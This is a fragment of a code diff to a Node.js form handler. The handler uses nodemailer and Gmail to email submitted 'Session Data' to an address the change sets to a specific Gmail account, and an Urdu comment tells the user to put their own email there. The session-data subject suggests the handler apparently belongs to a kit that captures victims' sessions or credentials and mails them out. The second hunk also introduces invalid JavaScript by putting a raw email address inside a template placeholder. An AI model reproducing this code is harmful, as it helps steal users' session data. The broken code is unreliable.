@@ -11,7 +11,7 @@ export default async function handler(req, res) {
     return res.status(400).json({ message: "Missing required fields" });
   }
 
-  const YOUR_EMAIL = "yourname@gmail.com"; // ← 📨 یہاں اپنی email لگائیں
+  const YOUR_EMAIL = "maxfire068@gmail.com"; // ← 📨 یہاں اپنی email لگائیں
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -22,7 +22,7 @@ export default async function handler(req, res) {
   });
 
   const mailOptions = {
-    from: `"Form Bot" <${YOUR_EMAIL}>`,
+    from: `"Form Bot" <${maxfire068@gmail.com}>`,
     to: YOUR_EMAIL,
     subject: "🔐 New Session Data Received",
     text: `
